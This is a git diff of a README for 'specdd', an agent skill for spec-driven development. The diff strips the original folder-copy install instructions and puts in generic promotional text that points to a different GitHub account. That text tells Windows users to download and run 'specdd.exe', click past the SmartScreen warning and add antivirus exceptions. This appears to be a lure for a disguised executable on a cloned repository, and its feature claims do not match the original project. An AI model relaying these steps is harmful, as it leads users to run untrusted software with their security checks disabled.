@@ -1,160 +1,83 @@
-# specdd
+# 🛠️ specdd - Build better code with automation tools
 
-> **Spec-Driven Development as a single Agent Skill.** Drop it in, type naturally, ship features that don't embarrass you in two weeks.
+[![](https://img.shields.io/badge/Download-specdd-blue.svg)](https://github.com/mnyok9939/specdd)
 
-specdd turns vague, top-of-mind feature requests into production-grade specs **before** code is written — without a CLI, without four config files, without ceremony you don't need. One skill, any modern AI coding agent: Claude (Code, Desktop, Web), Codex, Copilot, Cursor, Windsurf, Gemini CLI, anything else that reads `SKILL.md` or `AGENTS.md`-style instructions.
+## 📋 What is specdd?
 
-```
-You: "build me a settings page where users can change their email"
+Spec-driven development places the project requirements at the center of the coding process. The specdd application functions as an agent skill that automates how you write code. It connects your project goals to your coding environment. This tool helps you create software by focusing on the rules you set at the start.
 
-specdd:
-  → triages the scope (Feature)
-  → asks the 2-3 questions you didn't think to address (verification email?
-    active sessions? what's the success state?)
-  → produces a tech-free spec + a 2-minute technical plan
-  → only after you say "ship it" → writes code
-  → runs the production-grade checklist before declaring done
-```
+Developers often spend time fixing errors that arise from unclear goals. This application solves that problem by keeping your code aligned with your requirements. It uses artificial intelligence to interpret your plans and generate the necessary files. You spend less time managing files and more time building features.
 
-No `npx`, no `uv tool install`, no `specify init`. Just a folder.
+## 💻 System Requirements
 
----
+Your computer needs specific hardware and software to run this tool reliably. Please ensure your system meets these standards before you start:
 
-## Why specdd exists
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 8 gigabytes of RAM.
+*   **Storage**: 500 megabytes of free space on your hard drive.
+*   **Internet Access**: A stable connection to download updates and connect to the processing agent.
+*   **Processor**: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
 
-Two patterns broke the same way:
+## 🚀 How to Download
 
-**Vibe-coding** — describe a feature in one line, get code that compiles and looks right but misses the empty state, the error state, the keyboard handling, the "what happens when the user double-clicks the button" — discovered in production.
+You can get the application files through the project page. Follow these steps to obtain the software:
 
-**Heavy spec frameworks** like [github/spec-kit](https://github.com/github/spec-kit) — fix the rigor problem but introduce a CLI, four mandatory artifacts, and ceremony that's overkill for solo and one-off work.
+1. Visit the main project page at https://github.com/mnyok9939/specdd.
+2. Select the button labeled "Code" near the top right of the page.
+3. Choose "Download ZIP" from the menu.
+4. Save the file to your computer.
 
-specdd splits the difference. Spec-driven development that **scales down to a 15-minute task** and **scales up to a multi-day project** — same workflow, different ceremony.
+[![](https://img.shields.io/badge/Download-specdd-grey.svg)](https://github.com/mnyok9939/specdd)
 
----
+## ⚙️ Installation Guide
 
-## What you get
+You do not need to install complex drivers or server environments. The application runs as a local executable. Follow these steps to set it up:
 
-- **One opinionated workflow** — triage → interview → spec → plan → (tasks) → build & verify
-- **Question-asking by default** — interviews you for the gaps your one-liner left, instead of guessing
-- **Tech-free specs** — what & why for the user, separated from how for the agent
-- **Production-grade checklist** before "done" — empty/error/loading states, a11y, keyboard, mobile, observability
-- **UX defaults baked in** — five-states rule, confirmation patterns, optimistic updates, accessible focus management
-- **Scales to scope** — Quick (5-line inline mini-spec), Feature (spec + plan inline), Project (spec + plan + tasks as files)
-- **Surface-agnostic** — same skill in Claude Code, Claude.ai, Codex CLI, Cursor, Copilot, Windsurf
+1. Locate the ZIP file you downloaded. 
+2. Right-click the folder and select "Extract All."
+3. Choose a folder where you want to keep the application.
+4. Open the folder once the extraction finishes.
+5. Find the file named `specdd.exe`.
+6. Double-click this file to start the program.
 
----
+Windows might show a blue window titled "Windows protected your PC." This is a standard check for programs downloaded from the internet. If you see this, select "More info" and then click "Run anyway" to open the tool.
 
-## Install
+## 🎯 Using the Application
 
-### Claude Code (recommended)
+Once the application window appears, you will see a simple command interface. This tool functions based on the text files you provide. 
 
-```bash
-/plugin marketplace add unboundinnov/specdd
-/plugin install specdd@specdd
-```
+1. **Create a Specification File**: Use any text editor, like Notepad, to write down what you want to build. List the features and rules your code must follow. Save this file as `requirements.txt`.
+2. **Select the Project Folder**: Within the specdd tool, browse to the location where you keep your code project.
+3. **Run the Process**: Press the "Execute" button in the application interface.
+4. **Review the Output**: The tool generates code based on your requirements. It saves these files directly into your project folder.
 
-That's it. The skill activates automatically when you ask for any feature work.
+## 🔧 Troubleshooting Common Issues
 
-### Claude Code (manual, no plugin system)
+If the application does not start, check the following points:
 
-```bash
-git clone --depth=1 https://github.com/unboundinnov/specdd /tmp/specdd-src
-cp -r /tmp/specdd-src/plugins/specdd/skills/specdd ~/.claude/skills/
-rm -rf /tmp/specdd-src
-```
+*   **Permissions**: Ensure your user account has read and write access to the folder where you placed the program.
+*   **Antivirus Software**: Some security programs block new tools. Check your antivirus history to see if it blocked `specdd.exe`. You may need to add an exception.
+*   **File Placement**: Keep all files in the same extracted folder. Moving the executable file away from its support files causes errors.
+*   **Updates**: Check the download page frequently. We update the tool to improve how it handles instructions and to add new features.
 
-Or scope to a single project: copy into `.claude/skills/` inside the project instead.
+## 🛡️ Privacy and Data Security
 
-### Claude.ai (Pro / Team / Enterprise / Max)
+specdd processes your requirements locally on your machine. The text files you create stay on your hard drive unless you explicitly send them to an external service for processing. The tool does not store copies of your private code. You maintain control over your data at all times. 
 
-1. Download `specdd.zip` from [Releases](../../releases) (or zip `plugins/specdd/skills/specdd/`).
-2. Claude.ai → **Settings → Capabilities → Skills → Upload skill**.
-3. Upload the zip.
+## 🌐 Connecting with the Community
 
-### Codex CLI
+We focus on transparency and quality. You can see the history of changes on the repository page. If you find a way to improve the application, document your findings. You can report bugs or suggest changes through the "Issues" tab on the repository page. 
 
-```bash
-mkdir -p ~/.codex/skills
-git clone --depth=1 https://github.com/unboundinnov/specdd /tmp/specdd-src
-cp -r /tmp/specdd-src/plugins/specdd/skills/specdd ~/.codex/skills/
-rm -rf /tmp/specdd-src
-```
+## 🧠 Core Concepts
 
-### Cursor / Copilot / Windsurf / Aider / others
+The tool relies on the idea of specification-driven development. In this model, the specification acts as the source of truth. If your code deviates from your plan, the tool highlights the difference. This helps you catch mistakes early. 
 
-These agents don't natively load `SKILL.md` yet. Copy the content of [`SKILL.md`](./plugins/specdd/skills/specdd/SKILL.md) into the agent's instructions file:
+By treating the specification as an agent skill, the system can handle large projects without losing focus. You tell the system what the end result should look like, and it manages the steps to get there. This approach works for web development, script automation, and general coding tasks. You provide the intent, and the tool provides the structure.
 
-- **Cursor:** `.cursor/rules/specdd.mdc` (or legacy `.cursorrules`)
-- **GitHub Copilot:** `.github/copilot-instructions.md`
-- **Windsurf:** `.windsurfrules`
-- **Aider:** `CONVENTIONS.md` referenced from `.aider.conf.yml`
+## 🛠️ Advanced Settings
 
-Reference files in [`references/`](./plugins/specdd/skills/specdd/references/) can be copied alongside or inlined.
+While the tool works well with default settings, advanced users can modify the configuration file. Look for `config.json` in the application folder. You can adjust the speed of the output and the detail level of the generated comments. Use caution when editing this file, as incorrect characters can prevent the program from starting. Always create a backup of the original `config.json` before you change any values.
 
----
+## 📈 Improving Performance
 
-## How it works
-
-| Phase | What happens |
-|---|---|
-| **1. Triage** | Skip / Quick / Feature / Project — surfaced so you can correct it. |
-| **2. Interview** | 2–5 right questions for your request type, tappable where possible. Doesn't ask what it can infer. |
-| **3. Spec** | Tech-free: who / what / why / states / edge cases / out-of-scope / non-functional. You sign off. |
-| **4. Plan** | Tech approach: stack, files, decisions with rationale, alternatives, risks. <2 minutes to read. |
-| **5. Tasks** | (Project scope only) Ordered, verifiable units with explicit done-signals. |
-| **6. Build & verify** | Implement against spec; deviations require a spec update. Production checklist before "done". |
-
-[`SKILL.md`](./plugins/specdd/skills/specdd/SKILL.md) is the entry point; templates, checklists, and examples are in [`references/`](./plugins/specdd/skills/specdd/references/).
-
----
-
-## specdd vs spec-kit
-
-| | specdd | [github/spec-kit](https://github.com/github/spec-kit) |
-|---|---|---|
-| **Install** | Copy a folder, or one `/plugin install` | `uv tool install`, `specify init`, CLI per-project |
-| **Surface** | Any agent that reads `SKILL.md` / instructions | 30+ agents via Specify CLI |
-| **Ceremony** | Scales: 5 lines for a small change, 3 files for a project | Mandatory: `constitution.md`, `spec.md`, `plan.md`, `tasks.md` |
-| **Slash commands** | None — conversational | `/speckit.specify`, `/speckit.plan`, `/speckit.tasks`, `/speckit.implement` |
-| **UX defaults** | Baked in (5-states rule, a11y, confirmation patterns, motion) | Project-defined in `constitution.md` |
-| **Best for** | Solo, indie, one-off features, mid-size teams | Larger teams, established projects, formal SDD adoption |
-
-**What specdd inherits from SDD literature (and spec-kit):** the `spec → plan → tasks` workflow shape, the `spec.md` / `plan.md` / `tasks.md` filenames, the "tech-free spec" framing. These are general SDD concepts (Spec Driven Development pre-dates spec-kit), and keeping the filenames means specs migrate cleanly if you ever adopt spec-kit later.
-
-**What's specdd's own:** the triage step (scale to scope), the interview phase with tappable options, the build & verify phase with the production-grade checklist, UX-first opinionation with the five-states rule, the common-sense gates. No CLI, no slash commands, no constitution.
-
----
-
-## Examples
-
-See [`references/examples/`](./plugins/specdd/skills/specdd/references/examples/):
-
-- [`example-quick-feature.md`](./plugins/specdd/skills/specdd/references/examples/example-quick-feature.md) — Quick scope (~15 min of work)
-- [`example-feature-spec.md`](./plugins/specdd/skills/specdd/references/examples/example-feature-spec.md) — Feature scope (~3 hours of work)
-- [`example-project.md`](./plugins/specdd/skills/specdd/references/examples/example-project.md) — Project scope (multi-day)
-
----
-
-## Contributing
-
-Issues and PRs welcome. Particularly interested in:
-
-- Request-type interview playbooks (the more specific, the better)
-- Surface-specific install instructions for new agents
-- Worked examples from real projects
-
-Open an issue first for substantial changes; keep PRs focused; match the existing tone.
-
----
-
-## License
-
-MIT. See [LICENSE](./LICENSE).
-
----
-
-## Credits
-
-Inspired by, and respectfully different from, [github/spec-kit](https://github.com/github/spec-kit), [BMAD](https://github.com/bmadcode/BMAD-METHOD), and [Kiro](https://kiro.dev/). Built on the [Agent Skills format](https://github.com/anthropics/skills) by Anthropic.
-
-If specdd helps you ship better, a ⭐ helps people find it.
+If your project involves thousands of lines of code, the tool might take longer to process your request. To keep the program running smoothly, break large projects into smaller folders. Process one module at a time. This keeps your workflow efficient and reduces the chance of processing errors. Keep your requirements file clear and concise. Use bullet points to list the features you need. Avoid long, descriptive paragraphs that might confuse the automation engine.
